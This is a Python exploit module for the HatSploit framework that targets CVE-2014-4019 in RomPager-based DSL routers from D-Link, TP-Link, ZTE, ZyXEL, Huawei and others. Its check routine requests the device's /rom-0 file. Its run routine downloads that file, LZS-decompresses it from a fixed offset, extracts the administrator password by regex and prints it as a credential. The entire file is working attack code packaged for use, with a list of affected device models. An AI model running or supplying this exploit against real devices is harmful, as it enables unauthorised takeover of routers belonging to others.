"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import re

from hatsploit.lib.core.module.basic import *
from hatsploit.lib.core.module.proto import HTTP

from pex.string import String


class HatSploitModule(Module, HTTP):
    def __init__(self):
        super().__init__({
            'Category': "exploit",
            'Name': "RomPager Multi Password Disclosure",
            'Module': "exploit/linux/rompager/multi_password_disclosure",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - module developer',
            ],
            'Description': (
                "Numerious devices using RomPager are vulnerable to a password disclosure "
                "through extracting it from the downloaded rom-0 file."
            ),
            'Platform': OS_LINUX,
            'Rank': HIGH_RANK,
            'Devices': [
                "AirLive WT-2000ARM (2.11.6.0(RE0.C29)3.7.6.1)",
                "D-Link DSL-2520U (1.08 Hardware Version: B1)",
                "D-Link DSL-2640R",
                "D-Link DSL-2740R (EU_1.13 Hardware Version: A1)",
                "Huawei 520 HG",
                "Huawei 530 TRA",
                "Pentagram Cerberus P 6331-42",
                "TP-Link TD-8816",
                "TP-Link TD-8817 (3.0.1 Build 110402 Rel.02846)",
                "TP-LINK TD-8840T (3.0.0 Build 101208 Rel.36427)",
                "TP-Link TD-W8901G",
                "TP-Link TD-W8951ND",
                "TP-Link TD-W8961ND",
                "ZTE ZXV10 W300 (W300V1.0.0a_ZRD_CO3)",
                "ZTE ZXDSL 831CII (ZXDSL 831CIIV2.2.1a_Z43_MD)",
                "ZynOS",
                "ZyXEL ES-2024",
                "ZyXEL Prestige P-2602HW",
                "ZyXEL Prestige 782R",
            ],
            'References': [
                {'URL': 'https://github.com/EntySec/RomBuster'},
                {'URL': 'https://nvd.nist.gov/vuln/detail/cve-2014-4019'},
                {'URL': 'https://www.exploit-db.com/exploits/33803'},
                {'CVE': '2014-4019'},
                {'EDB': 33803}
            ],
            'DisclosureDate': "2014-06-18",
            'Notes': {
                'Stability': [CRASH_SAFE],
                'Reliability': [],
                'SideEffects': [],
            }
        })

        self.username = Option('USER', "admin", "Default username.", True)

    def check(self):
        response = self.http_request(
            method="GET",
            path='/rom-0'
        )

        if response and response.status_code == 200:
            return True

        return False

    def run(self):
        response = self.http_request(
            method="GET",
            path='/rom-0'
        )

        result = String().lzs_decompress(response.content[8568:])
        password = re.findall("([\040-\176]{5,})", result)

        if password:
            self.print_table(
                "Credentials", ('Username', 'Password'), (self.username.value, password[0])
            )
        else:
            self.print_warning(
                f"Target vulnerable, but default username is not {self.username.value}."
            )
